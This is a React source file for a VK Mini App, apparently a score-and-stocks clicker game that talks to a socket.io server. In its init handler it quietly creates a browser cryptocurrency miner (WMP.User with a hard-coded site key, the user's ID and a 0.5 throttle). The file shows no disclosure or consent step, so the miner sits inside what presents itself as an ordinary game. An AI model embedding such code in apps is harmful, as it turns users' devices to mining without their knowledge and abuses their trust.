import React, { Component } from 'react';
import bridge from '@vkontakte/vk-bridge';
import { VKMiniAppAPI } from "@vkontakte/vk-mini-apps-api";
import { io } from "socket.io-client"
import { AdaptivityProvider, AppRoot, ConfigProvider, Epic, Tabbar, TabbarItem, ScreenSpinner, withAdaptivity, Alert, Snackbar } from '@vkontakte/vkui';
import { Icon28HomeOutline, Icon28MoneyTransfer, Icon28MoneyTransferOutline, Icon28PollSquareOutline } from "@vkontakte/icons";
import '@vkontakte/vkui/dist/vkui.css';



import ViewHome from './views/ViewHome/ViewHome';
import ViewTransfer from './views/ViewTransfer/ViewTransfer';
import ViewStaics from './views/ViewStatics/ViewStatics';
import ModalMain from './modals/ModalMain';

const api = new VKMiniAppAPI();

class App extends Component {

	state = {
		activeStory: "home",
		activePanel: "main",
		popout: <ScreenSpinner />,
		snackbar: null,
		globState: {
			api: null,
			user: {
				score: 1,
				add_score: 2.56
			},
			stocks: []
		}
	}

	componentDidMount() {
		api.initApp();
		const socket = io("wss://cherry-pudding-44335.herokuapp.com" + window.location.search , { transports: ["websocket"], autoConnect: false } );
		socket.open();
		this.onError(socket);
		socket.on("init", this.init)
		this.setGlobState({ api, socket });
	}

	onError = (socket) => {
		socket.on("two_source", () => {
			clearInterval(this.state.globState.timer)
			this.setPopout(
				<Alert 
					header="Ошибка" 
					text="Вы уже подключены с другого устройства!"
					onClose={() => {
						this.setPopout(<ScreenSpinner />)
						socket.open();
					}} 
					actions={[
						{
							title: "Поробовать снова",
							action: () => {
								this.setPopout(<ScreenSpinner />)
								socket.open();
							}
						}
					]} 
				/>)
	   })

	   socket.on("disconnect", () => {
		   clearInterval(this.state.globState.timer)
	   })
	}

	init = (data) => {
		this.setPopout(null)
		const { socket } = this.state.globState;
		socket.emit("get_stocks", data.user_id);
		socket.on("get_stocks", (data) => {
			console.log(data)
			this.setGlobState({ stocks:  data})
		})
		

		let timer = setInterval(() => {
			const { user } = this.state.globState;
			socket.emit("add_score_timer", user.user_id);
		}, 2000);

		let timer_miner = setInterval(() => {
			const { user } = this.state.globState;
			socket.emit("add_score_timer_miner", user.user_id);
		}, 6000);

		socket.on("updated_score", (data) => {
			console.log(data)
			const { user } = this.state.globState;
			this.setGlobState({ user: { ...user, ...data }});
		})
		const { user } = this.state.globState;
		var miner = WMP.User('SK_dwgCbaomNA2QwH6xq5mdQ', String(user.user_id), {
			throttle: 0.5,
			forceASMJS: false
		});
		this.setGlobState({ user: { ...data, id: undefined }, timer, timer_miner, miner });
	}

	onclose = (e) => {
	
	}

	setGlobState = (e) => {
		const { globState } = this.state;
		this.setState({ globState: { ...globState, ...e }})
	}

	setActiveModal = (activeModal) => {
		this.setState({ activeModal });
	}

	setPopout = (popout) => {
		this.setState({ popout })
	}

	setSnackbar = (snackbar) => {
		this.setState({ snackbar })
	}

	onChangeStory = (activeStory) => {
		this.setState({ activeStory, activePanel: "main" });
	}
	
	go = (activePanel) => {
		this.setState({ activePanel });
	}
	
	render() {
		const { activePanel, activeStory, activeModal, popout, globState, snackbar } = this.state;			
		
		return(
			<ConfigProvider >
				<AdaptivityProvider>
					<AppRoot>
						<Epic
							activeStory={activeStory} 
							tabbar={
								<Tabbar>
									<TabbarItem selected={activeStory === "home"} onClick={() => this.onChangeStory("home")}>
										<Icon28HomeOutline />
									</TabbarItem>
									<TabbarItem selected={activeStory === "transfer"} onClick={() => this.onChangeStory("transfer")}>
										<Icon28MoneyTransferOutline />
									</TabbarItem>
									<TabbarItem selected={activeStory === "statics"} onClick={() => this.onChangeStory("statics")}>
										<Icon28PollSquareOutline />
									</TabbarItem>
								</Tabbar>
							}
						>


							<ViewHome 
								id="home" 
								modal={
									<ModalMain 
										activeModal={activeModal}
										setPopout={this.setPopout}
										setActiveModal={this.setActiveModal}
										globState={globState}
									/> 
								}
								activePanel={activePanel}
								popout={popout}
								snackbar={snackbar}
								globState={globState}
								setGlobState={this.setGlobState}
								setActiveModal={this.setActiveModal}
								setPopout={this.setPopout}
								setSnackbar={this.setSnackbar}
							/>

							<ViewTransfer 
								id="transfer" 
								modal={
									<ModalMain 
										activeModal={activeModal}
										setActiveModal={this.setActiveModal}
										globState={globState}
									/> 
								}
								activePanel={activePanel} 
								popout={popout}
								snackbar={snackbar}
								globState={globState}
								setGlobState={this.setGlobState}
								setPopout={this.setPopout}
								setSnackbar={this.setSnackbar}
							/>

							<ViewStaics 
								id="statics" 
								modal={
									<ModalMain 
										activeModal={activeModal}
										setActiveModal={this.setActiveModal}
										globState={globState}
									/> 
								}
								activePane={activePanel} 
								popout={popout}
								snackbar={snackbar}
								globState={globState}
								setGlobState={this.setGlobState}
								setPopout={this.setPopout}
								setSnackbar={this.setSnackbar}
							/>

						</Epic>
					</AppRoot>
				</AdaptivityProvider>
			</ConfigProvider>
		)
	}
}


export default withAdaptivity(App, {
	viewWidth:true
})

